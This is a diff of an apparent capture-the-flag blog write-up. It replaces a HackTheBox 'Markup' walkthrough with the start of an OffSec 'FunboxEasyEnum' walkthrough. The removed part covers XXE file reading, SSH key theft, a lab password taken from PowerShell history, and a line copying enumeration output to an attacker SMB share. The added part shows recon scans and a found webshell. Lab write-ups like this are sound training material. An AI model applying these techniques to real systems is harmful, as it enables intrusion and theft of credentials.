@@ -40,168 +40,119 @@ Looks like SSH and a webserver are both available.
 
 
 ```bash
-PORT    STATE SERVICE  REASON          VERSION                                                                                                                                                                           
-22/tcp  open  ssh      syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)                                                                                                                                           
-80/tcp  open  http     syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)                                                                                                                          
-|_http-title: MegaShopping                                                                                                                                                                                               
-443/tcp open  ssl/http syn-ack ttl 127 Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) 
+PORT   STATE SERVICE REASON         VERSION                                                                                                                                                                              
+22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                   
+80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))                                                                                               
+|_http-title: Apache2 Ubuntu Default Page: It works   
 ```
 
 I don't see any exploits available based off this info. I'll enumerate the webapp next.
 
 #### Webapp Enumeration
 
-Navigating in-browser to the app gets us a login Page. I run ferox buster to enum any directories, pages, or files in the meantime:
+Navigating in-browser to the app returns a default Apache wepserver landing page.
 
-![Webapp Login](/assets/img/ctf/htb/very-easy/markup/2.png)
+![Webapp Landing Page](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/1.png)
+
+I'll enumerate for interesting directories, pages, and files with *feroxbuster*
 
 ```bash
-┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
-└─$ feroxbuster --url $markup --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do 
+┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]                                                                                                                                                                
+└─$ feroxbuster --url http://$funbox --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
+                                                                                                                                                                                                                         
+ ___  ___  __   __     __      __         __   ___                                                                                                                                                                       
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                                                        
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                                                       
+by Ben "epi" Risher 🤓                 ver: 2.10.4                                                                                                                                                                       
+───────────────────────────┬──────────────────────                                                                                                                                                                       
+ 🎯  Target Url            │ http://192.168.134.132                                                                                                                                                                      
+ 🚀  Threads               │ 50                                                                                                                                                                                          
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt                                                                                                                   
+ 💢  Status Code Filters   │ [404]                                                                                                                                                                                       
+ 💥  Timeout (secs)        │ 7                                                                                                                                                                                           
+ 🦡  User-Agent            │ feroxbuster/2.10.4                                                                                                                                                                          
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                                                                          
+ 🔎  Extract Links         │ true                                                                                                                                                                                        
+ 💲  Extensions            │ [php, sh, txt, cgi, html, js, css, py, zip, aspx, pdf, docx, doc, md, log, htm, asp, do]                                                                                                    
+ 🏁  HTTP methods          │ [GET]                                                                                                                                                                                       
+ 🔃  Recursion Depth       │ 3                                                      
+
+301      GET        9l       28w      323c http://192.168.134.132/phpmyadmin => http://192.168.134.132/phpmyadmin/                                                                                                      
+.
+.
+.
+200      GET        1l        2w       21c http://192.168.134.132/robots.txt                                                                                                                                             
+.
+.
+.
+200      GET      114l      263w     3828c http://192.168.134.132/mini.php
 ```
 
-But this doesn't seem to reveal anything interseting. I also viewed the HTML source for version or other interesting information, but couldn't find anything.
+There are three finding worth exploring:
 
-Next thing I'll try is to use default creds. My goto is always admin:password and it works right off the bat.
+1. a /phpmyadmin directory
+2. robots.txt
+3. mini.php
 
-![Logged in](/assets/img/ctf/htb/very-easy/markup/3.png)
+Navigating to the phpmyadmin login page:
 
-First, I'll walk the app and explore each tab, making sure to view source for each and test any interactive features.
+![phpmyadmin Login Page](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/2.png)
 
-![Order Page](/assets/img/ctf/htb/very-easy/markup/4_0.png)
+I tried several default creds, but could not get in. I can try a bruteforce later as a last resort. For now, I'll try the other interesting items.
 
-The order page has the only discernable feature that 'does something' when the form is submitted. A popup appears when any values are entered. This page warrants a closer look by viewing the source:
+Let's checkout the robots.txt file:
 
-![Order page source](/assets/img/ctf/htb/very-easy/markup/4.png)
+![robots.txt](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/3.png)
 
-A name is mentioned. I'll note that down for future enumeration.
+Interesting. There is a rule listed here:
 
-Futher down in the source we can see that the form is submitting XML data. This could be vulnerable to XML External Entities attacks if the server does not have proper protections in place:
+```bash
+Allow: Enum_this_Box
+```
 
-![Order page source - XML](/assets/img/ctf/htb/very-easy/markup/5.png)
+This implies there is a directory at http://$funbox/Enum_this_Box/ that can be further enumerated. Let's see if we can find anything with a targeted discovery scan:
 
-### XML External Entity (XXE / XEE) Abuse
 
-Did some reading here: <a href="https://angelica.gitbook.io/hacktricks/pentesting-web/xxe-xee-xml-external-entity" alt='Hacktricks XXE XEE'>Hacktricks XXE / XEE</a>
+```bash
+┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]                                                                                                                                                                
+└─$ feroxbuster --url http://$funbox/Enum_this_Box/ --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,h
+tm,asp,do                                                                                                                                                                                                                
+                                                                                                                                                                                                                         
+ ___  ___  __   __     __      __         __   ___                                                                                                                                                                       
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                                                        
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                                                       
+by Ben "epi" Risher 🤓                 ver: 2.10.4                                                                                                                                                                       
+───────────────────────────┬──────────────────────                                                                                                                                                                       
+ 🎯  Target Url            │ http://192.168.134.132/Enum_this_Box/                                                                                                                                                       
+ 🚀  Threads               │ 50                                                                                                                                                                                          
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt                                                                                                                   
+ 💢  Status Code Filters   │ [404]                                                                                                                                                                                       
+ 💥  Timeout (secs)        │ 7                                                                                                                                                                                           
+ 🦡  User-Agent            │ feroxbuster/2.10.4                                                                                                                                                                          
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                                                                          
+ 🔎  Extract Links         │ true                                                                                                                                                                                        
+ 💲  Extensions            │ [php, sh, txt, cgi, html, js, css, py, zip, aspx, pdf, docx, doc, md, log, htm, asp, do]                                                                                                    
+ 🏁  HTTP methods          │ [GET]                                                                                                                                                                                       
+ 🔃  Recursion Depth       │ 3                                                                                                                                                                                           
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                                                                                       
+───────────────────────────┴──────────────────────                                                                                                                                                                       
+ 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                                                                                      
+──────────────────────────────────────────────────                                                                                                                                                                       
+404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                  
+[#####>--------------] - 9m    319993/1198710 25m     found:0       errors:0                                                                                                                                             
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_134_132_Enum_this_Box_-1761504214.state ...                                                                                                                  
+[#####>--------------] - 9m    320033/1198710 25m     found:0       errors:0                                                                                                                                             
+[#####>--------------] - 9m    319466/1198691 569/s   http://192.168.134.132/Enum_this_Box/  
+```
 
-After launching Burpsuite and starting Intercept:
-
-![Capturing the XML data](/assets/img/ctf/htb/very-easy/markup/6.png)
-
-1. I turned on my proxy in-browser
-2. Fill in dummy data
-3. Submit 
-
-![Intercept](/assets/img/ctf/htb/very-easy/markup/7.png)
-
-Once we've captured the XML, send it to the repeater for manipulation.
-
-![XXE / XEE Exploit](/assets/img/ctf/htb/very-easy/markup/8.png)
-
-1. The external entity is defined here. NOTE: for Windows paths, forward slashes seem to work, whereas backslashes do not.
-2. We need to insert the entity object inside an existing data object. The 'payload' object defined is inserted here with a prefix '&' and a suffix ';'
-3. We get LFI of the hosts file, proving we can leverage this exploit further for sensitve files
-
-So, how can we further leverage this vector for a foothold? Let's review some info we've enumerated already:
-
-1. SSH is enabled
-2. We have a username *Daniel*
-3. We can perform LFI to get sensitive files.
+I tried multiple different wordlists here. All failed to enumerate anything. This seems to be a rabit hole...moving on.
 
 ## Foothold
 
-Whenever LFI is possible AND we know SSH is enabled, we should always try to get SSH keys. Let's try to get Daniel's.
+I navigated to the last remaining interesting artifact: /mini.php
 
-![SSH Key](/assets/img/ctf/htb/very-easy/markup/9.png)
+![mini.php webshell](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/4.png)
 
-Nice, we were able to get their key. Pop that into a local id_rsa file and remember to change the permissions!
-
-```bash
-┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]
-└─$ chmod 600 id_rsa
-
-┌──(haunter㉿kali)-[~/working/htb/very-easy/markup]                                                                                                                                                                      
-└─$ ssh -i id_rsa daniel@$markup                                                                                                                                                                                         
-The authenticity of host '10.129.179.78 (10.129.179.78)' can't be established.                                                                                                                                           
-ED25519 key fingerprint is SHA256:v2qVZ0/YBh1AMB/k4lDggvG5dQb+Sy+tURkS2AiYjx4.                                                                                                                                           
-This host key is known by the following other names/addresses:
-    ~/.ssh/known_hosts:95: [hashed name]
-    ~/.ssh/known_hosts:116: [hashed name]
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.179.78' (ED25519) to the list of known hosts.
-Microsoft Windows [Version 10.0.17763.107]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-daniel@MARKUP C:\Users\daniel>
-```
-
-Foothold established as user daniel.
-
-```bash
-daniel@MARKUP C:\Users\daniel>whoami /priv && whoami /groups                                                                                                                                                             
-                                                                                                                                                                                                                         
-PRIVILEGES INFORMATION                                                                                                                                                                                                   
-----------------------                                                                                                                                                                                                   
-
-Privilege Name                Description                    State
-============================= ============================== =======
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
-GROUP INFORMATION
------------------
-
-Group Name                             Type             SID                                           Attributes
-====================================== ================ ============================================= ==================================================
-Everyone                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
-MARKUP\Web Admins                      Alias            S-1-5-21-103432172-3528565615-2854469147-1001 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Remote Management Users        Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
-BUILTIN\Users                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Local account             Well-known group S-1-5-113                                     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
-```
-
-**I like to switch to powershell once I get onto a Windows system and made it a habit.**
-
-After some initial enum, there appears to be nothing else special about the daniel account. I'll enumerate the system after grabbing the user flag:
-
-```bash
-daniel@MARKUP C:\Users\daniel>powershell
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
-
-PS C:\Users\daniel> cat .\Desktop\user.txt 
-******************************8ef7  
-```
-
-I did run winPEAS but the only promising finding was the user's PS history file.
-
-*I export winPEAS output to a file while also streaming it to console. Using the below method exports the info while preserving color data for review on my host machine*
-
-```bash
-$env:TERM = "xterm"
-.\winPEASx64.exe 2>&1 | ForEach-Object { $_; $_ } > winpeas_raw.txt
-cp winpeas_raw.txt \\10.10.16.18\attacker
-```
-
-![PS History File](/assets/img/ctf/htb/very-easy/markup/10.png)
-
-```bash
-PS C:\Users\daniel> cat C:\Users\daniel\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-.
-.
-.
-$pass = ConvertTo-SecureString "YAkpPzX2V_%" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential ("daniel",$pass)
-Start-Process -NoNewWindow -FilePath "C:\xampp\xampp_start.exe" -Credential $cred -WorkingDirectory c:\users\daniel\documents
-exit
-```
-
-There does appear to be a password. Let's save that to passwords.txt for good practice, but right now it doesn't offer any other lateral vectors.
 
 
 ## Lateral Movement / Privilege Escalation
